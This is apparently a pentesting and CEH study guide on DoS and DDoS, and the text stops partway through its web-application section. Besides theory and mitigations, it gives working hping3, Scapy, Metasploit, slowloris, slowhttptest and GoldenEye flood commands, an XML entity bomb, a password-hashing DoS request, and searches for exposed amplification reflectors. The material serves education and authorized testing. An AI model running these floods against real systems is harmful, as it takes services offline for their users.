# DoS-DDoS# 🛡️ DoS & DDoS — Complete Penetration Testing & Cybersecurity Notes

> **⚠️ Legal Disclaimer:** This document is intended strictly for **educational purposes**, **authorized penetration testing**, and **cybersecurity research**. Performing DoS/DDoS attacks against systems without explicit written permission is **illegal** under laws like the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, Bangladesh ICT Act 2006, and equivalent laws worldwide. **Always get written authorization before testing.**

---

## 📚 Table of Contents

1. [Core Concepts & Theory](#1-core-concepts--theory)
2. [How DoS Works — The Fundamentals](#2-how-dos-works--the-fundamentals)
3. [DoS vs DDoS — Key Differences](#3-dos-vs-ddos--key-differences)
4. [Attack Classification Tree](#4-attack-classification-tree)
5. [Volume-Based Attacks (Layer 3/4)](#5-volume-based-attacks-layer-34)
6. [Protocol Attacks (Layer 3/4)](#6-protocol-attacks-layer-34)
7. [Application Layer Attacks (Layer 7)](#7-application-layer-attacks-layer-7)
8. [Amplification & Reflection Attacks](#8-amplification--reflection-attacks)
9. [Botnet Architecture & C2 Infrastructure](#9-botnet-architecture--c2-infrastructure)
10. [Attack Tools — Pentest Perspective](#10-attack-tools--pentest-perspective)
11. [Slow & Low Attacks](#11-slow--low-attacks)
12. [DoS in Web Applications](#12-dos-in-web-applications)
13. [Network-Level Pentest Methodology](#13-network-level-pentest-methodology)
14. [Traffic Analysis & Attack Detection](#14-traffic-analysis--attack-detection)
15. [Mitigation & Defense Techniques](#15-mitigation--defense-techniques)
16. [Countermeasures by Attack Type](#16-countermeasures-by-attack-type)
17. [CEH Exam Key Points](#17-ceh-exam-key-points)
18. [Bug Bounty & Real-World DoS Testing](#18-bug-bounty--real-world-dos-testing)
19. [Quick Reference Cheat Sheet](#19-quick-reference-cheat-sheet)

---

## 1. Core Concepts & Theory

### What is Denial of Service (DoS)?

A **Denial of Service (DoS)** attack is an attempt to make a machine, service, or network resource **unavailable** to its intended users by overwhelming it with traffic, requests, or malformed packets — so it can no longer process legitimate requests.

The **CIA Triad** targeted: **Availability** (the "A" in CIA).

### The Three Pillars of DoS

| Pillar | What Gets Exhausted | Example |
|--------|---------------------|---------|
| **Bandwidth** | Network pipe capacity | Flood attack sending 10 Gbps to a 1 Gbps link |
| **Resource** | CPU, RAM, connection table, disk | SYN flood filling TCP connection table |
| **Application Logic** | App-level processing | HTTP flood hitting expensive DB queries |

### Why DoS Matters in Pentesting

- Availability is a core security requirement for any system
- Real attackers use DoS for: extortion (RaaS), competitive sabotage, hacktivism, diversion (attack during DDoS noise), cover tracks
- Pentesters must assess resilience against DoS as part of **infrastructure assessment** and **web app testing**
- Bug bounty programs increasingly reward **application-level DoS** (ReDoS, resource exhaustion, logic flaws)

---

## 2. How DoS Works — The Fundamentals

### Resource Exhaustion Model

Every system has **finite resources**:

```
Server Resources
├── CPU cycles
├── RAM / Memory
├── Network bandwidth (ingress/egress)
├── Disk I/O
├── TCP connection table (conntrack)
├── File descriptors
├── Thread/process pool
└── Database connection pool
```

A DoS attack **consumes one or more** of these resources faster than they can be replenished — until the system cannot serve legitimate users.

### The Attack Equation

```
Attack succeeds when:
  Attack Traffic Rate > System's Processing Capacity
                  OR
  Malformed Input > System's Error Handling Capability
                  OR
  Logic Complexity per Request × Request Rate > Server Resources
```

### TCP/IP Stack — Why It's Vulnerable

The TCP/IP stack was designed in the 1970s for **reliability**, not security. Key design flaws exploited by DoS:

- **TCP is stateful** → server must maintain connection state, consuming memory
- **IP source address is spoofable** → attacker can hide origin and exploit reflection
- **UDP is connectionless** → easy to flood without completing handshake
- **ICMP is required for network health** → can be weaponized for flooding

---

## 3. DoS vs DDoS — Key Differences

| Feature | DoS | DDoS |
|---------|-----|------|
| **Origin** | Single machine / IP | Multiple machines (botnet) |
| **Scale** | Limited by attacker's bandwidth | Can reach Tbps scale |
| **Detection** | Easier — one IP to block | Harder — thousands of IPs |
| **Mitigation** | Simple firewall rule | Requires scrubbing centers, CDN |
| **Tools** | hping3, Scapy, LOIC | Botnets, Mirai variants |
| **Infrastructure** | Attacker's machine | Compromised devices (IoT, VPS) |
| **Legal Risk** | High | Very High |

### DDoS Attack Scale Reference

| Year | Attack | Peak Bandwidth |
|------|--------|----------------|
| 2016 | Mirai → Dyn DNS | ~1.2 Tbps |
| 2018 | GitHub (memcached) | 1.35 Tbps |
| 2020 | AWS | 2.3 Tbps |
| 2022 | Google (HTTP/2) | 46 Million RPS |
| 2023 | HTTP/2 Rapid Reset | 398 Million RPS |

---

## 4. Attack Classification Tree

```
DoS / DDoS Attacks
├── By OSI Layer
│   ├── Layer 3 (Network) — IP flooding, ICMP flood
│   ├── Layer 4 (Transport) — SYN flood, UDP flood, ACK flood
│   └── Layer 7 (Application) — HTTP flood, Slowloris, ReDoS
│
├── By Attack Method
│   ├── Flood Attacks — overwhelm with raw traffic volume
│   ├── Amplification/Reflection — use third-party servers to amplify
│   ├── Protocol Exploitation — abuse protocol weakness (SYN, Smurf)
│   ├── Slow & Low — minimal traffic, maximum damage (Slowloris)
│   └── Logic/Resource Exhaustion — complex queries, regex, decompression
│
├── By Target
│   ├── Network Infrastructure (routers, switches)
│   ├── Server Resources (CPU, RAM, connections)
│   ├── Application Logic (web app, API, database)
│   └── Security Devices (IDS/IPS, firewall — state table exhaustion)
│
└── By Attack Source
    ├── Single Source — DoS
    ├── Distributed — DDoS (botnet)
    └── Reflected/Amplified — R-DDoS
```

---

## 5. Volume-Based Attacks (Layer 3/4)

### 5.1 UDP Flood

**How it works:**
- Attacker sends massive volume of UDP packets to random ports on target
- Target receives packet → checks for application listening on that port → none found → sends ICMP "Destination Unreachable" back
- This process consumes CPU and bandwidth on both sides
- With spoofed source IPs, target is overwhelmed generating ICMP replies

**Packet structure used:**
```
UDP Datagram:
  Source IP:   Spoofed random IP
  Dest IP:     Target IP
  Source Port: Random
  Dest Port:   Random (or specific: 53, 80, 443)
  Data:        Random garbage bytes
```

**Lab simulation (authorized test only):**
```bash
# hping3 UDP flood to test own server
sudo hping3 --udp -p 80 --flood --rand-source <TARGET_IP>

# Scapy UDP flood
from scapy.all import *
send(IP(dst="TARGET_IP", src=RandIP())/UDP(dport=RandShort())/Raw(RandString(512)), loop=1, verbose=0)
```

**Mitigation:** Rate-limit UDP at firewall, block unused UDP ports, use upstream ISP scrubbing.

---

### 5.2 ICMP Flood (Ping Flood)

**How it works:**
- Attacker sends continuous stream of ICMP Echo Request (ping) packets
- Target must process each and send Echo Reply
- Consumes both inbound and outbound bandwidth
- Historically done with `ping -f` (flood ping) — disabled on most modern systems

**Lab simulation:**
```bash
# hping3 ICMP flood
sudo hping3 -1 --flood <TARGET_IP>

# Old-style (if enabled)
ping -f <TARGET_IP>
```

**Mitigation:** Block or rate-limit ICMP at perimeter firewall, enable ICMP rate limiting on OS.

---

### 5.3 Smurf Attack (ICMP Amplification — Classic)

**How it works:**
1. Attacker sends ICMP Echo Request to a **network broadcast address**
2. **Source IP is spoofed** as the victim's IP
3. Every host on that subnet replies with ICMP Echo Reply — all to the victim
4. Amplification factor = number of hosts on subnet

```
Attacker → ICMP Echo Req (src=Victim IP) → Broadcast 192.168.1.255
All hosts (say 254) → ICMP Echo Reply → Victim IP
Amplification: 1 packet becomes 254 packets hitting victim
```

**Status:** Mostly mitigated by modern ISPs (RFC 2644 — routers don't forward directed broadcasts), but concept is important for understanding amplification.

---

### 5.4 Fraggle Attack

Same as Smurf but uses **UDP** instead of ICMP, targeting port 7 (Echo) or port 19 (Chargen).

---

## 6. Protocol Attacks (Layer 3/4)

### 6.1 SYN Flood — The Most Classic DoS Attack

**TCP Three-Way Handshake (Normal):**
```
Client          Server
  |---SYN-------->|   Client sends SYN (seq=X)
  |<--SYN-ACK-----|   Server reserves memory, sends SYN-ACK (seq=Y, ack=X+1)
  |---ACK-------->|   Client completes handshake
  |               |   Connection ESTABLISHED
```

**SYN Flood Attack:**
```
Attacker (spoofed IPs)    Server
  |---SYN (IP1)-------->|   Server allocates TCB (Transmission Control Block)
  |---SYN (IP2)-------->|   Server sends SYN-ACK to fake IP1 → no reply
  |---SYN (IP3)-------->|   Server sends SYN-ACK to fake IP2 → no reply
  |---SYN (IP4)-------->|   Connection stays in SYN_RCVD state
  ...thousands more...     TCP backlog queue FILLS UP
  |                        Legitimate SYNs DROPPED — service unavailable
```

**Key detail:** Each half-open connection stays in `SYN_RCVD` state for ~75 seconds (default) before timeout. Default backlog queue on Linux = 128 (can be tuned). Attacker needs to send SYNs faster than they expire.

**Lab simulation:**
```bash
# SYN flood with hping3
sudo hping3 -S -p 80 --flood --rand-source <TARGET_IP>
# -S = SYN flag
# -p 80 = port 80
# --flood = send as fast as possible
# --rand-source = randomize source IP

# With specific packet size
sudo hping3 -S -p 443 --flood --rand-source -d 120 <TARGET_IP>
# -d 120 = 120 byte data payload
```

**Check effect on Linux target:**
```bash
# Count half-open connections
ss -n state SYN-RECV | wc -l

# Watch connection table
watch -n 1 'ss -s'

# Check netstat
netstat -an | grep SYN_RECV | wc -l
```

**Mitigation:**
- **SYN Cookies** (most important) — server doesn't allocate memory until ACK received
- Reduce SYN_RCVD timeout: `sysctl -w net.ipv4.tcp_synack_retries=1`
- Increase backlog: `sysctl -w net.ipv4.tcp_max_syn_backlog=4096`
- Enable SYN cookies: `sysctl -w net.ipv4.tcp_syncookies=1`
- Rate-limit SYN packets at firewall: `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`

---

### 6.2 ACK Flood

**How it works:**
- Send massive ACK packets with spoofed IPs
- Server receives ACK but has no matching connection → sends RST back
- Consumes CPU processing each unexpected ACK
- More effective against **stateful firewalls** — fills state table

```bash
# ACK flood with hping3
sudo hping3 -A -p 80 --flood --rand-source <TARGET_IP>
# -A = ACK flag
```

---

### 6.3 RST/FIN Flood

**How it works:**
- Send RST or FIN packets to forcibly terminate existing connections
- Disrupts active TCP sessions
- Used against long-lived connections (database, VPN sessions)

```bash
# RST flood
sudo hping3 -R -p 80 --flood --rand-source <TARGET_IP>
# -R = RST flag
```

---

### 6.4 Ping of Death

**How it works:**
- Standard ICMP Echo Request maximum size = 65,535 bytes
- TCP/IP allows IP fragmentation — large packets split into fragments
- Attacker sends fragments that reassemble into oversized packet (>65,535 bytes)
- Target's reassembly buffer **overflows → kernel crash**

**Status:** Patched in modern OS (Windows patch: 1997, Linux: similar era). Still relevant for legacy embedded systems, IoT.

---

### 6.5 Teardrop Attack

**How it works:**
- IP fragmentation works by offset values telling receiving end where each fragment fits
- Attacker sends fragments with **overlapping offset values**
- Reassembly code gets confused → crashes or freezes

**Status:** Patched in modern OS. Relevant for ICS/SCADA, old embedded devices.

---

### 6.6 Land Attack

**How it works:**
- Send TCP SYN packet where **source IP = destination IP** AND **source port = destination port**
- Target connects to itself → infinite loop → system hangs

```
SYN packet: src=192.168.1.10:80, dst=192.168.1.10:80
```

**Status:** Patched. Historical importance for CEH.

---

## 7. Application Layer Attacks (Layer 7)

Application layer attacks are the **hardest to defend** because:
- Traffic looks legitimate (valid HTTP requests)
- Cannot be blocked by IP/port rules
- Very low bandwidth needed (high impact, low traffic)
- HTTPS makes deep packet inspection harder

### 7.1 HTTP GET/POST Flood

**HTTP GET Flood:**
- Send massive number of legitimate-looking HTTP GET requests
- Target legitimate URLs that trigger database queries, file reads, computations
- Server must process each fully (unlike SYN flood where connection is half-open)

```bash
# Using Apache Bench (ab) — for authorized stress testing
ab -n 100000 -c 1000 http://TARGET_IP/page

# Using wrk
wrk -t 12 -c 400 -d 30s http://TARGET_IP/

# Using hping3 (manual HTTP GET)
sudo hping3 -p 80 -S --flood <TARGET_IP>
```

**HTTP POST Flood:**
- More expensive per request because:
  - Server must read entire POST body before responding
  - POST usually triggers write operations (DB inserts)
  - Can target login forms, search, upload endpoints

---

### 7.2 Slowloris Attack

**The most elegant application DoS.** Invented by Robert "RSnake" Hansen.

**How it works:**
1. Open many connections to target web server
2. Send partial HTTP request headers (never complete)
3. Periodically send more header bytes to keep connection alive
4. Server keeps connection open waiting for complete request
5. Fill all available connections → legitimate users get 503

**Why it's powerful:**
- Uses very little bandwidth (~few KB/s)
- One machine can take down Apache with ~65,000 connections
- Doesn't trigger bandwidth-based detection

**Normal HTTP Request:**
```
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0...\r\n
\r\n          ← blank line signals end of headers
```

**Slowloris Request (never sends the final \r\n):**
```
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
X-Header-1: value1\r\n       ← keeps adding headers every 15 seconds
X-Header-2: value2\r\n       ← never sends final blank line
...                          ← connection stays open indefinitely
```

**Tool:**
```bash
# Install slowloris
pip install slowloris

# Run (authorized test only)
slowloris TARGET_IP -p 80 -s 1000 --sleeptime 15
# -s 1000 = 1000 concurrent connections
# --sleeptime 15 = send header every 15 seconds

# Alternative: slowhttptest
sudo apt install slowhttptest
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://TARGET_IP/ -x 24 -p 3
```

**Affected servers:** Apache (heavily), IIS (older versions)
**Resistant servers:** nginx, lighttpd (event-driven architecture handles this better)

**Detection:**
```bash
# Check for many connections in ESTABLISHED state from same IPs with partial requests
netstat -an | grep :80 | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# Apache connection count
apachectl status | grep "requests currently being processed"
```

**Mitigation:**
- `mod_reqtimeout` in Apache → set `RequestReadTimeout header=10-20,MinRate=500 body=20,MinRate=500`
- Switch to nginx (event-driven, not thread-per-connection)
- Use a load balancer/reverse proxy that handles connection timeouts
- Connection timeout settings

---

### 7.3 RUDY (R-U-Dead-Yet?)

Similar to Slowloris but targets HTTP **POST** requests.

**How it works:**
1. Open HTTP POST connection with legitimate `Content-Length` header (say 1,000,000 bytes)
2. Send POST body **extremely slowly** — 1 byte every few seconds
3. Server keeps connection open waiting for complete POST body
4. Exhausts server thread/connection pool

```bash
# slowhttptest RUDY mode
slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t POST -u http://TARGET_IP/login -x 24 -p 3
# -B = Body exhaustion (RUDY mode)
```

---

### 7.4 HTTP/2 Rapid Reset (CVE-2023-44487)

**One of the most powerful attacks discovered in 2023.**

**How it works:**
- HTTP/2 supports multiplexing — many streams over one connection
- Client can cancel a stream immediately after sending request (RST_STREAM)
- Attack: Send thousands of requests then immediately cancel with RST_STREAM
- Server processes the request before receiving RST → massive CPU usage
- Single client can generate 398 million RPS

**Why it bypasses defenses:**
- Looks like normal HTTP/2 traffic
- Connection stays valid (not a connection flood)
- Traditional rate limiting doesn't catch it

**Status:** Patched by major vendors (nginx, Apache, HAProxy, cloud providers) in Oct 2023. Unpatched servers still vulnerable.

**Check if nginx version is patched:**
```bash
nginx -v
# Patched: 1.25.3+ / 1.24.0+ (with patch) / 1.20.0+ (backported)
```

---

### 7.5 ReDoS (Regular Expression Denial of Service)

**Important for web app pentesting and bug bounty.**

**How it works:**
- Certain regex patterns are **catastrophically backtracking** — take exponential time for specific inputs
- If user input is processed by a vulnerable regex on the server, attacker can send crafted input
- One HTTP request can hang a server thread for seconds/minutes

**Vulnerable regex example:**
```
Pattern: ^(a+)+$
Input:   "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaX"
```

The regex engine backtracks exponentially trying to match each combination of `(a+)` groups.

**Test for ReDoS:**
```python
import re, time

pattern = re.compile(r'^(a+)+$')
test_input = 'a' * 30 + 'X'

start = time.time()
pattern.match(test_input)
print(f"Time: {time.time() - start:.2f}s")
# If > 1 second, ReDoS vulnerable
```

**Finding ReDoS in web apps:**
- Identify input fields processed server-side (email validation, username, search)
- Test with long repeated character strings + non-matching character at end
- Tools: `reDOS-checker`, `vuln-regex-detector`

**Mitigation:**
- Use atomic groups or possessive quantifiers in regex
- Set regex execution timeout
- Validate input length before regex processing
- Use non-backtracking regex engines (RE2, Rust regex)

---

### 7.6 XML/JSON Bomb

**XML Bomb (Billion Laughs Attack):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... repeat to lol9 -->
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

When parsed, this expands to ~1 billion "lol" strings — consuming all RAM.

**Zip Bomb:**
- Upload tiny zip file that expands to terabytes
- Target: file upload endpoints that extract archives
- Example: 42.zip (42 KB → 4.5 PB when extracted)

**Test for XML/JSON DoS:**
- Send deeply nested JSON: `{"a":{"a":{"a":...}}}` (1000 levels deep)
- Send XML with entity expansion
- Send extremely large arrays in JSON

---

## 8. Amplification & Reflection Attacks

### The Core Concept

```
Without Amplification:
  Attacker (1 Gbps) → sends 1 Gbps to Victim

With Amplification + Reflection:
  Attacker (1 Gbps) → sends 1 Gbps to Reflectors
  Reflectors (×70 amplification) → send 70 Gbps to Victim
```

**Two key elements:**
1. **Reflection:** Attacker spoofs source IP as victim's IP → server sends reply to victim
2. **Amplification:** Reply is much larger than request

### 8.1 DNS Amplification

**How it works:**
1. Attacker sends small DNS query (~60 bytes) with source IP spoofed as victim
2. DNS server responds with large DNS reply (~3,000 bytes) to victim
3. Amplification factor: ~50x

**Best query for amplification:** `ANY` record type for a domain with large DNS records

```bash
# Query size vs response size comparison
dig @8.8.8.8 google.com A        # Small response (~50 bytes)
dig @8.8.8.8 google.com ANY      # Large response (~3000 bytes)

# Amplification factor test (authorized only)
dig @TARGET_DNS_SERVER example.com ANY
# Measure response byte size / query byte size
```

**Spoofed UDP DNS request (conceptual — for understanding):**
```
UDP Packet:
  Source IP:   Victim's IP (SPOOFED)
  Dest IP:     Open DNS Resolver
  Dest Port:   53
  Query:       ANY isc.org (generates large response)

DNS Resolver sends large response → Victim IP
```

**Finding open DNS resolvers:**
```bash
# Test if a DNS server is an open resolver (amplification risk)
dig @SUSPICIOUS_DNS_SERVER google.com
# If it answers queries for domains it shouldn't → open resolver
```

**Amplification factors by protocol:**

| Protocol | Port | Amplification Factor |
|----------|------|---------------------|
| DNS | UDP 53 | 28x – 54x |
| NTP (monlist) | UDP 123 | 556x (historic max) |
| Memcached | UDP 11211 | **10,000x – 51,000x** |
| SSDP | UDP 1900 | 30x |
| CharGen | UDP 19 | 358x |
| LDAP | UDP 389 | 46x – 70x |
| SNMP | UDP 161 | 6x – 65x |
| RIP | UDP 520 | 131x |

---

### 8.2 NTP Amplification (monlist)

**How it works:**
- NTP `monlist` command returns list of last 600 hosts that queried the NTP server
- Response can be 556x larger than request
- Attacker sends monlist request with spoofed source = victim IP

```bash
# Check if NTP server supports monlist (pentest check)
ntpdc -c monlist TARGET_NTP_SERVER

# If it responds with a list → vulnerable to amplification abuse
```

**Mitigation:** Disable monlist: `noquery` in `/etc/ntp.conf`, upgrade to NTP 4.2.7p26+

---

### 8.3 Memcached Amplification (Largest Ever)

**The GitHub 1.35 Tbps attack used this.**

**How it works:**
- Memcached is a caching daemon — should only be on private networks
- Attacker finds Memcached servers exposed on UDP port 11211
- Stores large data in them beforehand, then sends small GET request (spoofed src = victim)
- Server sends massive response to victim
- Amplification: up to 51,000x

**Find exposed Memcached servers:**
```bash
# Shodan search (for research/authorized audit)
# Query: port:11211 country:BD
shodan search "port:11211"

# Test if Memcached is exposed via UDP
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u TARGET_IP 11211
```

**Mitigation:** Never expose Memcached on public internet, disable UDP (`-U 0` flag), firewall UDP 11211.

---

## 9. Botnet Architecture & C2 Infrastructure

### What is a Botnet?

A **botnet** is a network of compromised machines (**bots/zombies**) controlled by an attacker (**bot herder/botmaster**) via a **Command and Control (C2/C&C) server**.

```
Bot Herder
    │
    ▼
C2 Server ──────────────────────────────┐
    │                                   │
    ├─── Bot 1 (infected PC)            │
    ├─── Bot 2 (compromised IoT)        │ Instructions:
    ├─── Bot 3 (hacked VPS)             │ "FLOOD 192.168.1.1:80"
    └─── Bot N (pwned server)           │
         ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓          │
              Target Victim ←───────────┘
```

### C2 Communication Models

**1. Centralized (IRC-based, HTTP-based):**
- All bots connect to one C2 server
- Easy to control, easy to take down (single point of failure)
- Early botnets: Agobot, SDBot (IRC-based)

**2. P2P (Peer-to-Peer):**
- No single C2 server — bots communicate with each other
- Harder to take down (no single point of failure)
- Examples: Storm Worm, Nugache

**3. Domain Generation Algorithm (DGA):**
- Bots generate domain names algorithmically based on date/seed
- Attacker registers one domain from daily list → C2 communication
- Defenders must predict/sink-hole all generated domains
- Examples: Conficker, GameOver Zeus

**4. Fast-Flux DNS:**
- C2 domain resolves to different IP every few minutes
- Thousands of bots act as proxies for real C2
- Extremely hard to block/take down

### Famous Botnets

| Botnet | Year | Peak Size | Method | Notes |
|--------|------|-----------|--------|-------|
| Mirai | 2016 | 600,000 IoT devices | Default credential brute force | Took down Dyn DNS |
| Zeus | 2007-2014 | 13 million | Banking trojan | Stole millions in banking creds |
| Conficker | 2008 | 9-15 million | MS08-067 exploit | DGA, P2P C2 |
| GameOver Zeus | 2011 | 1 million | Spam + exploit kits | P2P variant of Zeus |
| Emotet | 2014-2021 | 1.8 million | Malicious Office docs | Loader for other malware |
| Necurs | 2012 | 9 million | Email spam | Largest spam botnet |

### Mirai Architecture (IoT Botnet — Study Case)

```
Mirai Source Code Components:
├── bot/          ← runs on infected IoT device
│   ├── attack_*.c    ← DDoS attack modules (UDP, SYN, ACK, HTTP, DNS, etc.)
│   ├── scanner.c     ← scans for other vulnerable IoT (port 23, 2323)
│   └── killer.c      ← kills competing malware on device
├── cnc/          ← command and control server (Go)
└── loader/       ← infects vulnerable devices once found by scanner
```

**How Mirai spread:**
1. Scanner scans internet for Telnet (port 23/2323)
2. Brute forces 61 default credential pairs (admin/admin, root/root, etc.)
3. If successful → loads Mirai bot binary
4. Bot connects to C2, awaits attack instructions
5. Instruction example: `udp TARGET_IP 80 60` (UDP flood target for 60 seconds)

**Lesson for defenders:** Change default credentials on every device.

---

## 10. Attack Tools — Pentest Perspective

> All tools below are for **authorized testing only**. Use in isolated lab environments.

### 10.1 hping3 — Swiss Army Knife

hping3 is the go-to tool for manual packet crafting and DoS simulation in authorized environments.

```bash
# Installation
sudo apt install hping3

# SYN Flood
sudo hping3 -S --flood -p 80 --rand-source TARGET_IP

# UDP Flood  
sudo hping3 --udp --flood -p 53 --rand-source TARGET_IP

# ICMP Flood
sudo hping3 -1 --flood TARGET_IP

# ACK Flood
sudo hping3 -A --flood -p 80 TARGET_IP

# Custom packet: SYN with large payload
sudo hping3 -S -p 80 -d 1400 --flood TARGET_IP
# -d 1400 = 1400 byte payload (near MTU)

# Fragmentation test
sudo hping3 -f -p 80 TARGET_IP
# -f = fragment packet

# Specify interval (not flood)
sudo hping3 -S -p 80 -i u10000 TARGET_IP
# -i u10000 = 10000 microseconds between packets

# TCP RST attack
sudo hping3 -R -p 80 --flood TARGET_IP

# LAND attack simulation
sudo hping3 -S -p 80 -a TARGET_IP TARGET_IP
# -a = spoof source IP as target IP itself
```

### 10.2 Scapy — Packet Crafting in Python

```python
from scapy.all import *

# SYN flood
def syn_flood(target, port, count=1000):
    for i in range(count):
        ip = IP(dst=target, src=RandIP())
        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=RandInt())
        send(ip/tcp, verbose=0)

# UDP flood
def udp_flood(target, count=1000):
    for i in range(count):
        ip = IP(dst=target, src=RandIP())
        udp = UDP(dport=RandShort(), sport=RandShort())
        data = Raw(RandString(512))
        send(ip/udp/data, verbose=0)

# ICMP flood
def icmp_flood(target, count=1000):
    for i in range(count):
        pkt = IP(dst=target, src=RandIP())/ICMP()
        send(pkt, verbose=0)

# Fragmentation attack
def frag_attack(target):
    # Fragment ID must match to trigger reassembly
    frag1 = IP(dst=target, id=12345, flags="MF", frag=0)/ICMP()/("A"*1480)
    frag2 = IP(dst=target, id=12345, frag=185)/("B"*100)
    send([frag1, frag2], verbose=0)

# Run
syn_flood("192.168.1.100", 80, 5000)
```

### 10.3 Metasploit DoS Modules

```bash
msfconsole

# Search for DoS modules
msf6 > search type:auxiliary dos

# Common DoS modules
use auxiliary/dos/tcp/synflood
set RHOST TARGET_IP
set RPORT 80
run

# HTTP Slowloris in Metasploit
use auxiliary/dos/http/slowloris
set RHOST TARGET_IP
set RPORT 80
set TIMEOUT 1800
run

# MS12-020 (Windows RDP DoS)
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOST TARGET_IP
run
```

### 10.4 Slowloris

```bash
# Python version
pip install slowloris
slowloris TARGET_IP -p 80 -s 500 --sleeptime 15

# With HTTPS
slowloris TARGET_IP -p 443 -s 500 --https

# slowhttptest (more advanced)
sudo apt install slowhttptest

# Slowloris mode (header exhaustion)
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://TARGET_IP/ -x 24 -p 3
# -c 1000 = 1000 connections
# -H = header exhaustion (Slowloris mode)
# -i 10 = interval between follow-up data (seconds)
# -r 200 = connections per second rate
# -x 24 = max length of data follow-up
# -p 3 = probe wait time

# RUDY mode (body exhaustion)
slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t POST -u http://TARGET_IP/login -x 24 -p 3
# -B = body exhaustion

# Apache Range Header attack (slowread)
slowhttptest -c 1000 -X -r 200 -t GET -u http://TARGET_IP/ -x 24 -p 3
# -X = slow read mode
```

### 10.5 LOIC / HOIC (Low Orbit Ion Cannon)

- Used by Anonymous in Operation Payback (2010)
- LOIC: GUI-based, sends HTTP/TCP/UDP floods
- HOIC: Upgraded version, uses "boosters" (JS scripts) for evasion
- **Note:** No IP spoofing → attacker's real IP exposed → used in criminal prosecutions
- Educational value: Understanding volunteer-based DDoS (hivemind mode)

### 10.6 GoldenEye (HTTP DoS)

```bash
# Clone
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye

# Run
python goldeneye.py http://TARGET_IP/ -w 50 -s 500 -m GET
# -w 50 = 50 worker threads
# -s 500 = 500 sockets per worker
# -m GET = method

# POST mode
python goldeneye.py http://TARGET_IP/ -m POST
```

### 10.7 HULK (HTTP Unbearable Load King)

- HTTP GET flood that generates unique requests to bypass caching
- Uses random User-Agents, Referrers, query string parameters
- Each request is unique → can't be cached → hits backend server

### 10.8 THC-SSL-DOS

- Exploits SSL/TLS handshake renegotiation
- Each SSL renegotiation requires significant server CPU
- One client can occupy server CPU disproportionately

```bash
thc-ssl-dos TARGET_IP 443 --accept
```

### 10.9 ab (Apache Bench) — Legitimate Stress Testing

```bash
# 10,000 requests, 100 concurrent
ab -n 10000 -c 100 http://TARGET_IP/

# With HTTP keepalive
ab -n 10000 -c 100 -k http://TARGET_IP/

# POST request
ab -n 1000 -c 50 -p post_data.txt -T application/json http://TARGET_IP/api/
```

### 10.10 wrk — Modern HTTP Benchmarking

```bash
# Install
sudo apt install wrk

# Basic stress test
wrk -t 4 -c 200 -d 60s http://TARGET_IP/

# With Lua script for custom requests
wrk -t 4 -c 200 -d 60s -s script.lua http://TARGET_IP/
```

---

## 11. Slow & Low Attacks

### Why Slow & Low?

Traditional rate-based defenses look for **high traffic volume**. Slow & Low attacks use:
- Minimal bandwidth (evades volume detection)
- Valid protocol behavior (evades signature detection)
- Long connection duration (ties up server resources)

### Summary Table

| Attack | Target | Bandwidth Needed | Method |
|--------|--------|-----------------|--------|
| Slowloris | Apache, IIS | Very Low (~KB/s) | Partial HTTP headers |
| RUDY | Any server | Very Low | Slow POST body |
| Slow Read | Any server | Very Low | Slow TCP window shrink |
| CC Attack | Web app logic | Medium | Heavy computation requests |
| ReDoS | App tier | Very Low | Crafted regex input |

### Slow Read Attack

**How it works:**
1. Client connects and sends valid request
2. Client **advertises tiny TCP receive window** (e.g., 1 byte)
3. Server sends response 1 byte at a time, waiting for ACK each time
4. Server's send buffer stays full → socket tied up → connection held open

```bash
# slowhttptest slow read mode
slowhttptest -c 1000 -X -r 200 -t GET -u http://TARGET_IP/ -p 3 -l 300
```

---

## 12. DoS in Web Applications

### 12.1 Finding DoS Vulnerabilities in Web Apps

**Target high-cost endpoints:**

```
Low cost endpoints (safe to flood):
  GET /index.html          ← static, cached
  GET /static/image.png    ← file serve, cheap

High cost endpoints (DoS targets):
  GET /search?q=XXXX       ← database full-text search
  POST /api/report/generate ← PDF generation, heavy processing
  GET /api/export/all       ← large data export
  POST /upload              ← file processing, scanning
  GET /api/recalculate      ← complex computation
```

**Common web app DoS scenarios:**

1. **Unauthenticated heavy endpoint** — search/report without rate limiting
2. **Authentication bypass** → hit expensive authenticated endpoint
3. **Large file upload** → exhaust disk/memory
4. **Password hashing DoS** — bcrypt/argon2 is intentionally slow; send long passwords (72+ chars), if no length limit → max CPU per request

```bash
# Password hashing DoS test
# If bcrypt is used and no password length limit:
# Send password = "A" * 1000000 → bcrypt hashes all of it → server hangs

curl -X POST http://TARGET_IP/login \
  -d "username=admin&password=$(python3 -c 'print("A"*100000)')"
```

5. **GraphQL depth/complexity attack:**
```graphql
# Deeply nested GraphQL query — exponential DB queries
{
  users {
    friends {
      friends {
        friends {
          friends {
            name email
          }
        }
      }
    }
  }
}
```

### 12.2 Rate Limiting Testing

```bash
# Test for rate limiting on login endpoint
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://TARGET_IP/login \
    -d "username=admin&password=wrong${i}"
done
# If all return 200/302 (not 429 Too Many Requests) → no rate limiting

# Test with different IPs (if you have access to proxy)
# Or test rate limit bypass via: X-Forwarded-For header manipulation
